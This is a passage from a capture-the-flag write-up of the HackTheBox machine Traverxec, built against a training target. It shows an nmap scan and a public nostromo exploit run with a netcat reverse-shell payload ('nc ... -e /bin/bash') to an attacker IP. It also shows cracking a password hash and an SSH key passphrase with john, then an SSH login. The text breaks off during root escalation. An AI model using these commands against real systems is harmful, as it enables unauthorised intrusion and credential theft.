@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+		<h1><strong>hackthebox Traverexec</strong></h1>
+		<em>Released: 16th November 2019 / Pwned: 17th March 2020 - [+] Solved whilst Active</em><br>
+		<br>
+		<img alt="images/3-1.png" src="images/3-1.png"><br>
+		<br>
+		Traverxec is a relatively simple box with a unique exploit path.<br>
+		<br>
+		<strong></strong>
+		<h4><strong>Summary</strong></h4>
+		• Exploit the webserver via directory traversal to get a shell<br>
+		• Crack david's <code>.htaccess</code> password and download his ssh backups<br>
+		• Crack the <code>id_rsa</code> passphrase and ssh in as <code>david</code><br>
+		• Read one of <code>david</code>'s scripts to find that you have sudo permissions to execute <code>journalctl</code>, which you can drop into a root shell<br>
+		<br>
+		<strong></strong>
+		<h2 id="h2-1"><strong>1. Nmap</strong></h2><br>
+		First, scan the target with Nmap.<br>
+		I do an all-ports scan, followed by a service detection and default scripts against the open ports.<br>
+			<div class="codebox">
+				┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p-&nbsp;10.10.10.165&nbsp;-oN&nbsp;nmap/tcp-all.txt</span><br>
+				Starting&nbsp;Nmap&nbsp;7.80&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2020-03-16&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>46&nbsp;GMT<br>
+				Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">10</span>.10.10.165<br>
+				Host&nbsp;is&nbsp;up&nbsp;(0.035s&nbsp;latency).<br>
+				Not&nbsp;shown:&nbsp;65533&nbsp;filtered&nbsp;ports<br>
+				PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+				22/tcp&nbsp;open&nbsp;&nbsp;ssh<br>
+				80/tcp&nbsp;open&nbsp;&nbsp;http<br>
+				<br>
+				Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;115.56&nbsp;seconds<br>
+				<br>
+				┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p&nbsp;22,80&nbsp;-sV&nbsp;-sC&nbsp;10.10.10.165&nbsp;-oN&nbsp;nmap/tcp-open.txt</span><br>
+				Starting&nbsp;Nmap&nbsp;7.80&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2020-03-16&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>49&nbsp;GMT<br>
+				Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">10</span>.10.10.165<br>
+				Host&nbsp;is&nbsp;up&nbsp;(0.032s&nbsp;latency).<br>
+				<br>
+				PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+				22/tcp&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.9p1&nbsp;Debian&nbsp;10+deb10u1&nbsp;(protocol&nbsp;2.0)<br>
+				|&nbsp;ssh-hostkey:&nbsp;<br>
+				|&nbsp;&nbsp;&nbsp;2048&nbsp;aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c&nbsp;(RSA)<br>
+				|&nbsp;&nbsp;&nbsp;256&nbsp;93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc&nbsp;(ECDSA)<br>
+				|_&nbsp;&nbsp;256&nbsp;9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce&nbsp;(ED25519)<br>
+				80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;nostromo&nbsp;1.9.6<br>
+				|_http-server-header:&nbsp;nostromo&nbsp;1.9.6<br>
+				|_http-title:&nbsp;TRAVERXEC<br>
+				Service&nbsp;Info:&nbsp;OS:&nbsp;Linux;&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel<br>
+				<br>
+				Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+				Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;8.26&nbsp;seconds
+			</div>
+		</div><br>
+		<br>
+		Only 2 services are open:<br>
+		• 22/ssh - not useful for the time being (but good to know for later)<br>
+		• 80/http - A webserver, a weird one - <code>nostromo 1.9.6</code><br>
+		<br>
+		<strong></strong>
+		<h2 id="h2-2"><strong>2. Nostromo 1.9.6</strong></h2><br>
+		This webserver seems unique, so check for exploits.<br>
+			<div class="codebox">
+				┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#searchsploit&nbsp;nostromo&nbsp;-w</span><br>
+				--------------------------------------------&nbsp;--------------------------------------------<br>
+				&nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;URL<br>
+				--------------------------------------------&nbsp;--------------------------------------------<br>
+				Nostromo&nbsp;-&nbsp;Directory&nbsp;Traversal&nbsp;Remote&nbsp;Comma&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>47573<br>
+				nostromo&nbsp;1.9.6&nbsp;-&nbsp;Remote&nbsp;Code&nbsp;Execution&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>47837<br>
+				nostromo&nbsp;nhttpd&nbsp;1.9.3&nbsp;-&nbsp;Directory&nbsp;Traversal&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>35466
+			</div>
+		</div><br>
+		<br>
+		Nice!<br>
+		It looks there's remote code execution.<br>
+		And this script will do it all for us - <a href="https://www.exploit-db.com/exploits/47837">https://www.exploit-db.com/exploits/47837</a><br>
+		<br>
+		Start a listener<br>
+			<div class="codebox">
+				<span style="color:#0088ff;font-weight:400">#&nbsp;Start&nbsp;listener</span><br>
+				┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lvnp&nbsp;443</span><br>
+				listening&nbsp;on&nbsp;[any]&nbsp;443&nbsp;...
+			</div>
+		</div><strong><br></strong><br>
+		Run the exploit<br>
+			<div class="codebox">
+				┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;nostromo.py&nbsp;10.10.10.165&nbsp;80&nbsp;"nc&nbsp;10.10.14.12&nbsp;443&nbsp;-e&nbsp;/bin/bash"</span><br>
+				[...]
+			</div>
+		</div><br>
+		<br>
+		We have a shell :)<br>
+			<div class="codebox">
+				[...]<br>
+				listening&nbsp;on&nbsp;[any]&nbsp;443&nbsp;...<br>
+				connect&nbsp;to&nbsp;[10.10.14.12]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.165]&nbsp;34298<br>
+				<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;python<br>
+				<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>python<br>
+				python&nbsp;-c&nbsp;<span style="color:#3ad900;font-weight:400">'import&nbsp;pty;pty.spawn("/bin/bash")'</span>&nbsp;<br>
+				www-data@traverxec<span style="color:#ff9d00;font-weight:700">:/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin$&nbsp;
+			</div>
+		</div><br>
+		<br>
+		<strong></strong>
+		<h2 id="h2-3"><strong>3. Priv-Esc - www-data to david</strong></h2><br>
+		We've been attacking a webserver, so I had a look at the webserver files.<br>
+		There's a config file.<br>
+			<div class="codebox">
+				www-data@traverxec<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>nostromo<span style="color:#ff9d00;font-weight:700">/</span>conf$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;nhttpd.conf<br>
+				<span style="color:#0088ff;font-weight:400">#&nbsp;MAIN&nbsp;[MANDATORY]</span><br>
+				servername&nbsp;&nbsp;traverxec.htb<br>
+				serverlisten&nbsp;&nbsp;*<br>
+				serveradmin&nbsp;&nbsp;david@traverxec.htb<br>
+				serverroot&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>nostromo<br>
+				servermimes&nbsp;&nbsp;conf<span style="color:#ff9d00;font-weight:700">/</span>mimes<br>
+				docroot&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>nostromo<span style="color:#ff9d00;font-weight:700">/</span>htdocs<br>
+				docindex&nbsp;&nbsp;index.html<br>
+				<br>
+				<span style="color:#0088ff;font-weight:400">#&nbsp;LOGS&nbsp;[OPTIONAL]</span><br>
+				logpid&nbsp;&nbsp;&nbsp;logs<span style="color:#ff9d00;font-weight:700">/</span>nhttpd.pid<br>
+				<br>
+				<span style="color:#0088ff;font-weight:400">#&nbsp;SETUID&nbsp;[RECOMMENDED]</span><br>
+				user&nbsp;&nbsp;&nbsp;www-data<br>
+				<br>
+				<span style="color:#0088ff;font-weight:400">#&nbsp;BASIC&nbsp;AUTHENTICATION&nbsp;[OPTIONAL]</span><br>
+				htaccess&nbsp;&nbsp;.htaccess<br>
+				htpasswd&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>nostromo<span style="color:#ff9d00;font-weight:700">/</span>conf<span style="color:#ff9d00;font-weight:700">/</span>.htpasswd<br>
+				<br>
+				<span style="color:#0088ff;font-weight:400">#&nbsp;ALIASES&nbsp;[OPTIONAL]</span><br>
+				<span style="color:#ff9d00;font-weight:700">/</span>icons&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>nostromo<span style="color:#ff9d00;font-weight:700">/</span>icons<br>
+				<br>
+				<span style="color:#0088ff;font-weight:400">#&nbsp;HOMEDIRS&nbsp;[OPTIONAL]</span><br>
+				homedirs&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<br>
+				homedirs_public&nbsp;&nbsp;public_www
+			</div>
+		</div><strong><br>
+		<br></strong>Two items are interesting here:<br>
+		• <code>/var/nostromo/conf/.htpasswd</code> - which probably contains credentials<br>
+		• <code>homedirs</code> - which I have no idea what this is<br>
+		<br>
+		<strong></strong>
+		<h3 id="h3-1"><strong>3a) .htpasswd</strong></h3><br>
+		Inside <code>/var/nostromo/conf/.htpasswd</code> there's credentials for david<br>
+			<div class="codebox">
+				www-data@traverxec<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>nostromo<span style="color:#ff9d00;font-weight:700">/</span>conf$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;.htpasswd<br>
+				david<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#7f0044;font-weight:400">$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ</span><span style="color:#ff9d00;font-weight:700">/</span>
+			</div>
+		</div><br>
+		<br>
+		Crack them with <code>john</code><br>
+			<div class="codebox">
+				┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec<span style="color:#ff9d00;font-weight:700">/</span>loot]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;david.hash</span><br>
+				[...]<br>
+				david<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#7f0044;font-weight:400">$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ</span><span style="color:#ff9d00;font-weight:700">/</span><br>
+				┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec<span style="color:#ff9d00;font-weight:700">/</span>loot]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#john&nbsp;--wordlist=/usr/share/wordlists/rockyou.txt&nbsp;david.hash</span><br>
+				Warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;detected&nbsp;<span style="color:#ff9d00;font-weight:700">hash</span>&nbsp;<span style="color:#ff9d00;font-weight:700">type</span>&nbsp;<span style="color:#3ad900;font-weight:400">"md5crypt"</span>,&nbsp;but&nbsp;the&nbsp;string&nbsp;is&nbsp;also&nbsp;recognized&nbsp;as&nbsp;<span style="color:#3ad900;font-weight:400">"md5crypt-long"</span><br>
+				[...]<br>
+				Nowonly4me&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>david<span style="color:#ff9d00;font-weight:700">)</span>
+			</div>
+		</div><br>
+		<br>
+		<strong></strong>
+		<h3 id="h3-2"><strong>3b) HOMEDIRS</strong></h3><br>
+		The Nostromo man page describes what HOMEDIRS are - <a href="http://www.nazgul.ch/dev/nostromo_man.html">http://www.nazgul.ch/dev/nostromo_man.html</a><br>
+		<br>
+		The <code>homedirs</code> option lets you serve the home directories of users via HTTP.<br>
+		The URL of the user's home directory is - <code>http://example.com/~user/</code><br>
+		<br>
+		The <code>homedirs_public</code> specifies specific sub-directories in a users' home folder to be included (instead of the entire home folder).<br>
+		In the config above, that's <code>public_www</code><br>
+		<br>
+		In /home is <code>david</code>, which we can't read.<br>
+		Have a look in <code>david</code>'s <code>/home/david/public_www</code> folder<strong><br></strong>
+			<div class="codebox">
+				www-data@traverxec<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>nostromo<span style="color:#ff9d00;font-weight:700">/</span>conf$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>david<span style="color:#ff9d00;font-weight:700">/</span>public_www<br>
+				<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>david<span style="color:#ff9d00;font-weight:700">/</span>public_www<br>
+				total&nbsp;16K<br>
+				drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;3&nbsp;david&nbsp;david&nbsp;4.0K&nbsp;Oct&nbsp;25&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;.<br>
+				drwx--x--x&nbsp;6&nbsp;david&nbsp;david&nbsp;4.0K&nbsp;Mar&nbsp;17&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;..<br>
+				-rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;david&nbsp;david&nbsp;&nbsp;402&nbsp;Oct&nbsp;25&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>45&nbsp;index.html<br>
+				drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;2&nbsp;david&nbsp;david&nbsp;4.0K&nbsp;Oct&nbsp;25&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;protected-file-area
+			</div>
+		</div><br>
+		<br>
+		<h3 id="h3-3"><strong>3c) proteced-file-area</strong></h3><br>
+		If we browse to - <a href="http://10.10.10.165/~david">http://10.10.10.165/~david</a> - we're told to keep out.<br>
+		<img alt="images/3-2.png" src="images/3-2.png"><br>
+		<strong><br></strong>If we browse to - <a href="http://10.10.10.165/~david/protected-file-area/">http://10.10.10.165/~david/protected-file-area/</a> - we can now auth using the credentials we cracked earlier:<br>
+		<code>david / Nowonly4me</code><strong><br>
+		<br></strong><img alt="images/3-3.png" src="images/3-3.png"><br>
+		<br>
+		Download, unzip, and untar the ssh backup files.<strong><br></strong>
+			<div class="codebox">
+				┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#gunzip&nbsp;backup-ssh-identity-files.tgz</span><br>
+				┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#tar&nbsp;-xf&nbsp;backup-ssh-identity-files.tar&nbsp;</span><br>
+				┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cd&nbsp;home/david/.ssh/</span><br>
+				┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>david<span style="color:#ff9d00;font-weight:700">/</span>.ssh]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ls&nbsp;-alh</span><br>
+				total&nbsp;12K<br>
+				drwx------&nbsp;1&nbsp;horace&nbsp;horace&nbsp;&nbsp;&nbsp;62&nbsp;Oct&nbsp;25&nbsp;22<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;.<br>
+				drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;Mar&nbsp;17&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>47&nbsp;..<br>
+				-rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;horace&nbsp;horace&nbsp;&nbsp;397&nbsp;Oct&nbsp;25&nbsp;22<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;authorized_keys<br>
+				-rw-------&nbsp;1&nbsp;horace&nbsp;horace&nbsp;1.8K&nbsp;Oct&nbsp;25&nbsp;22<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;id_rsa<br>
+				-rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;horace&nbsp;horace&nbsp;&nbsp;397&nbsp;Oct&nbsp;25&nbsp;22<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;id_rsa.pub<br>
+				┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>david<span style="color:#ff9d00;font-weight:700">/</span>.ssh]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cat&nbsp;id_rsa</span><br>
+				-----BEGIN&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----<br>
+				Proc-Type<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;4,ENCRYPTED<br>
+				DEK-Info<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F<br>
+				<br>
+				seyeH<span style="color:#ff9d00;font-weight:700">/</span>feG19TlUaMdvHZK<span style="color:#ff9d00;font-weight:700">/</span>2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG<br>
+				tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W<br>
+				<br>
+				[...]
+			</div>
+		</div><br>
+		<br>
+		We can SSH in using that <code>id_rsa</code> file, but it's password protected.<br>
+		Crack it with <code>john</code>.<strong><br></strong>
+			<div class="codebox">
+				┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>david<span style="color:#ff9d00;font-weight:700">/</span>.ssh]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#locate&nbsp;ssh2john</span><br>
+				<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>john<span style="color:#ff9d00;font-weight:700">/</span>ssh2john.py<br>
+				┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>david<span style="color:#ff9d00;font-weight:700">/</span>.ssh]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#/usr/share/john/ssh2john.py&nbsp;id_rsa&nbsp;&gt;&nbsp;id_rsa.john</span><br>
+				┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>david<span style="color:#ff9d00;font-weight:700">/</span>.ssh]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#john&nbsp;--wordlist=/usr/share/wordlists/rockyou.txt&nbsp;id_rsa.john</span><br>
+				Using&nbsp;default&nbsp;input&nbsp;encoding<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;UTF-8<br>
+				Loaded&nbsp;1&nbsp;password&nbsp;<span style="color:#ff9d00;font-weight:700">hash</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>SSH&nbsp;[RSA<span style="color:#ff9d00;font-weight:700">/</span>DSA<span style="color:#ff9d00;font-weight:700">/</span>EC<span style="color:#ff9d00;font-weight:700">/</span>OPENSSH&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>SSH&nbsp;private&nbsp;keys<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;32<span style="color:#ff9d00;font-weight:700">/</span>64]<span style="color:#ff9d00;font-weight:700">)</span><br>
+				Cost&nbsp;1&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>KDF<span style="color:#ff9d00;font-weight:700">/</span>cipher&nbsp;[0=MD5<span style="color:#ff9d00;font-weight:700">/</span>AES&nbsp;1=MD5<span style="color:#ff9d00;font-weight:700">/</span>3DES&nbsp;2=Bcrypt<span style="color:#ff9d00;font-weight:700">/</span>AES]<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;is&nbsp;0&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">all</span>&nbsp;loaded&nbsp;hashes<br>
+				Cost&nbsp;2&nbsp;(iteration&nbsp;count)&nbsp;is&nbsp;1&nbsp;for&nbsp;all&nbsp;loaded&nbsp;hashes<br>
+				Will&nbsp;run&nbsp;2&nbsp;OpenMP&nbsp;threads<br>
+				Note:&nbsp;This&nbsp;format&nbsp;may&nbsp;emit&nbsp;false&nbsp;positives,&nbsp;so&nbsp;it&nbsp;will&nbsp;keep&nbsp;trying&nbsp;even&nbsp;after<br>
+				finding&nbsp;a&nbsp;possible&nbsp;candidate.<br>
+				Press&nbsp;'q'&nbsp;or&nbsp;Ctrl-C&nbsp;to&nbsp;abort,&nbsp;almost&nbsp;any&nbsp;other&nbsp;key&nbsp;for&nbsp;status<br>
+				hunter&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(id_rsa)
+			</div>
+		</div><br>
+		<br>
+		Log in as <code>david</code>.<strong><br></strong>
+			<div class="codebox">
+				┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>htb<span style="color:#ff9d00;font-weight:700">/</span>traverxec<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>david<span style="color:#ff9d00;font-weight:700">/</span>.ssh]<br>
+				└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ssh&nbsp;david@10.10.10.165&nbsp;-i&nbsp;id_rsa</span><br>
+				Enter&nbsp;passphrase&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">key</span>&nbsp;'id_rsa':&nbsp;<br>
+				Linux&nbsp;traverxec&nbsp;4.19.0-6-amd64&nbsp;#1&nbsp;SMP&nbsp;Debian&nbsp;4.19.67-2+deb10u1&nbsp;(2019-09-20)&nbsp;x86_64<br>
+				david@traverxec:~$&nbsp;
+			</div>
+		</div><br>
+		<br>
+		Grab <code>user.txt</code><strong><br></strong>
+			<div class="codebox">
+				david@traverxec<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;user.txt<br>
+				7db0b4...
+			</div>
+		</div><br>
+		<br>
+		<strong></strong>
+		<h2 id="h2-4"><strong>4. Priv-Esc to root</strong></h2><br>
+		In <code>david</code>'s home, <code>bin</code> looks interesting<br>
+			<div class="codebox">
+				david@traverxec<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+				total&nbsp;36K<br>
+				drwx--x--x&nbsp;5&nbsp;david&nbsp;david&nbsp;4.0K&nbsp;Oct&nbsp;25&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;.<br>
+				drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;3&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Oct&nbsp;25&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>32&nbsp;..<br>
+				lrwxrwxrwx&nbsp;1&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9&nbsp;Oct&nbsp;25&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>15&nbsp;.bash_history&nbsp;-&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+				-rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;david&nbsp;david&nbsp;&nbsp;220&nbsp;Oct&nbsp;25&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>32&nbsp;.bash_logout<br>
